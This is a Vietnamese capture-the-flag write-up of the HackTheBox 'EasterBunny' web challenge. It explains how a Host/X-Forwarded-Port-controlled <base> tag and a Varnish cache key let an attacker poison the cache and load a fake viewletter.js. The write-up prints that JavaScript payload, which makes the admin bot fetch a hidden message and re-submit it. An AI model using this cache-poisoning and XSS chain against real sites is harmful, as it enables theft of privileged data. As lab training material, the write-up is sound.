# [HTB] Web - EasterBunny Write Up!
## By @ndkhai
***
* Link Challenge: `https://app.hackthebox.com/challenges/easterbunny`
* Challenge Description: `It's that time of the year again! Write a letter to the Easter bunny and make your wish come true! But be careful what you wish for because the Easter bunny's helpers are watching!`
* Necessary files to play the challenge: `Source Code`
***
## Sơ lược tính năng của ứng dụng
1. Giao diện chính của web:

 ![image](https://github.com/nguyenkhai98/writeup/assets/51147179/a90bf878-f7ca-4bcc-9078-f447450f0a87)

2. Ứng dụng cho phép submit thư mới lên hệ thống, gọi vào link `/submit`. Nội dung thư mới sẽ được insert vào DB với id tăng dần.

3. Ứng dụng cho phép đọc nội dung của các thư hiện có trên hệ thống (link URL: `/letters?id=x`)

## Source code

Mục tiêu của Challenge là đọc được nội dung của message có `id=3`. Nội dung của các message đã được input sẵn trong Database:
```sql
INSERT INTO messages (id, message, hidden) VALUES
              (1, "Dear Easter Bunny,\nPlease could I have the biggest easter egg you have?\n\nThank you\nGeorge", 0),
              (2, "Dear Easter Bunny,\nCould I have 3 chocolate bars and 2 easter eggs please!\nYours sincerly, Katie", 0),
              (3, "Dear Easter Bunny, Santa's better than you! HTB{f4k3_fl4g_f0r_t3st1ng}", 1),
              (4, "Hello Easter Bunny,\n\nCan I have a PlayStation 5 and a chocolate chick??", 0),
              (5, "Dear Ester Bunny,\nOne chocolate and marshmallow bunny please\n\nLove from Milly", 0),
              (6, "Dear Easter Bunny,\n\nHow are you? Im fine please may I have 31 chocolate bunnies\n\nThank you\nBeth", 0);
```

Message **id=3** có trường **hidden=1**, do vậy, không thể view được nội dung của message này trên giao diện web theo cách thông thường, giống như các message khác. Đoạn code xử lý phần này như sau:

```javascript
router.get("/message/:id", async (req, res) => {
    try {
        const { id } = req.params;
        const { count } = await db.getMessageCount();
        const message = await db.getMessage(id);

        if (!message) return res.status(404).send({
            error: "Can't find this note!",
            count: count
        });

        if (message.hidden && !isAdmin(req))
            return res.status(401).send({
                error: "Sorry, this letter has been hidden by the easter bunny's helpers!",
                count: count
            });
```

=> Như vậy các message có trường **hidden=1** và **!isAdmin(req)** thì sẽ không hiển thị nội dung ra bên ngoài trình duyệt. Để đạt được mục đích, ta phải tìm cách để request đọc message id=3 phải được hiểu là xuất phát từ **admin**.

File **authorisation.js** có nội dung sau liên quan đến việc check tài khoản là Admin:

```javascript
const isAdmin = (req, res) => {
  return req.ip === '127.0.0.1' && req.cookies['auth'] === authSecret;
};
```

Như vậy `isAdmin(req)=True` khi thỏa mãn đồng thời hai điều kiện sau: `req.ip === '127.0.0.1'` và `req.cookies['auth'] === authSecret`

Tiếp tục đào sâu nội dung Code của Challenge để tìm kiếm thêm các nội dung có liên quan đến hai điều kiện trên, ta nhận thấy đoạn code khi gọi đến link `/submit` có phần gọi đến link `http://127.0.0.1/letters?id=${inserted.lastID}`

```javascript
router.post("/submit", async (req, res) => {
    const { message } = req.body;

    if (message) {
        return db.insertMessage(message)
            .then(async inserted => {
                try {
                    botVisiting = true;
                    await visit(`http://127.0.0.1/letters?id=${inserted.lastID}`, authSecret);
                    botVisiting = false;
                }
                catch (e) {
                    console.log(e);
                    botVisiting = false;
                }
                res.status(201).send(response(inserted.lastID));
            })
            .catch(() => {
                res.status(500).send(response('Something went wrong!'));
            });
    }
    return res.status(401).send(response('Missing required parameters!'));
});
```

Request ***await visit(`http://127.0.0.1/letters?id=${inserted.lastID}`, authSecret);*** vừa hay đáp ứng hai điều kiện để `isAdmin(req)=True`.

### Điều kiện cần số 1 => Vậy để đọc được nội dung của message có `id=3`, ta phải tìm cách để trigger code chạy được lệnh: ***await visit(`http://127.0.0.1/letters?id=3`, authSecret);***.

But how???

Tiếp tục đọc chi tiết phần code xử lý request đến URL `/letters` như sau: 

```javascript
router.get("/letters", (req, res) => {
    return res.render("viewletters.html", {
        cdn: `${req.protocol}://${req.hostname}:${req.headers["x-forwarded-port"] ?? 80}/static/`,
    });
});
```

=> Khi `GET /letters` thì ứng dụng sẽ trả về nội dung từ `viewletters.html` với giá trị `cdn` như trên. Okay, vậy giá trị **cdn** có vai trò gì?
Cùng check nội dung file **viewletters.html**:

![image](https://github.com/nguyenkhai98/writeup/assets/51147179/088503b6-26a7-404b-a9af-3673082cf792)


File này extends nội dung từ **base.html**:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <base href="{{cdn}}" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
    <link href="https://fonts.googleapis.com/css2?family=Caveat&amp;family=Secular+One&amp;display=swap" rel="stylesheet" />
    <link href="main.css" rel="stylesheet" />
    <title>Write to the Easter Bunny!</title>
  </head>

  <body>

  </body>
</html>
```
=> Trong nội dung **base.html**, có nội dung code sau `<base href="{{cdn}}" />`. Thẻ `<base>` trong `html` chỉ định đường dẫn cơ sở (base url) cho toàn bộ các liên kết tương đối trong nội dung file html. Do vậy các liên kết tương đối trong **base.html** và **viewletters.html** sẽ trở thành như sau:

`<link href="main.css" rel="stylesheet" />` => `{{cdn}}/main.css` => `${req.protocol}://${req.hostname}:${req.headers["x-forwarded-port"] ?? 80}/static/main.css`

`<script src="viewletter.js"></script>` => `{{cdn}}/viewletter.js` => `${req.protocol}://${req.hostname}:${req.headers["x-forwarded-port"] ?? 80}/static/viewletter.js`

Thinking!!! Chúng ta có thể lợi dụng được gì trong tình huống này? ... Nếu manipulate được các nội dung như **${req.protocol}**, **${req.hostname}**, **${req.headers["x-forwarded-port"]** thì ta có thể khiến cho URL trỏ đến các file **viewletter.js** thay đổi, và nếu ta thay đổi link đến file fake **viewletter.js** trên server mà ta quản lý thì ta hoàn toàn có thể chỉnh sửa tùy ý nội dung của file **viewletter.js** fake này => Run các script theo ý định mà ta muốn (XSS).


### Điều kiện cần số 2 => khiến Request trỏ đến file viewletter.js fake, qua đó Run Script tùy ý.

Nghiên cứu đoạn thông tin docker challenge được cung cấp, ta thấy ứng dụng sử dụng **Varnish Cache** với thông tin cấu hình trong file **cache.vcl**:

```
vcl 4.1;

backend default {
    .host = "127.0.0.1";
    .port = "1337";
}

sub vcl_hash {
    hash_data(req.url);

    if (req.http.host) {
        hash_data(req.http.host);
    } else {
        hash_data(server.ip);
    }

    return (lookup);
}
```

Nội dung file config cho thấy ứng dụng sẽ thực hiện cache theo các thông tin: URL và host hoặc IP. => Như vậy nếu Request A trả về kết quả gọi đến file `viewletter.js` fake thì khi ta khởi tạo request B (sau request A) với chung URL và Host hoặc IP cũng sẽ gọi đến file `viewletter.js` fake.

### Điều kiện cần số 3 => Cần phải thực hiện Cache Poisoning để đánh lừa ứng dụng gọi đến file  `viewletter.js` fake.

***
## Exploit

Kết hợp các thông tin từ 3 điều kiện cần ở trên, ta tiến hành chuẩn bị các bước để Exploit Challenge như sau:

1. Dựng 1 web server để chứa file **viewletter.js** fake, nội dung của file fake như sau:

```javascript
fetch("http://127.0.0.1:80/message/3").then((r) => {
    return r.text();
}).then((x) => {
    fetch("http://127.0.0.1:80/submit", {
        "headers": {
            "content-type": "application/json"
        },
        "body": x,
        "method": "POST",
        "mode": "cors",
        "credentials": "omit"
    });
});
```

Thử truy cập đến link file trên để chắc chắn rằng ứng dụng có thể gọi đến file fake này:

![image](https://github.com/nguyenkhai98/writeup/assets/51147179/415f98f5-be6a-4ad8-b65c-4426ec36de6f)

2. Thực hiện Cache Poisoning

![image](https://github.com/nguyenkhai98/writeup/assets/51147179/dfe4df62-aa1a-466d-8245-d673f7feb318)

=> Nếu request sau cũng trỏ đến URL `/letters?id=13` thì sẽ gọi đến file **viewletter.js** fake mà ta đã setup bên trên.

3. Thực hiện call đến `/submit` để write new letter => Ứng dụng sẽ gọi đến `http://127.0.0.1/letters?id=${inserted.lastID}` với `lastID=13` (thứ tự ID mới nhất)

![image](https://github.com/nguyenkhai98/writeup/assets/51147179/70531239-ad9f-4672-a50d-a1f30dfd7c62)

![image](https://github.com/nguyenkhai98/writeup/assets/51147179/2ef27374-6b2b-4189-8d89-a122078577d9)
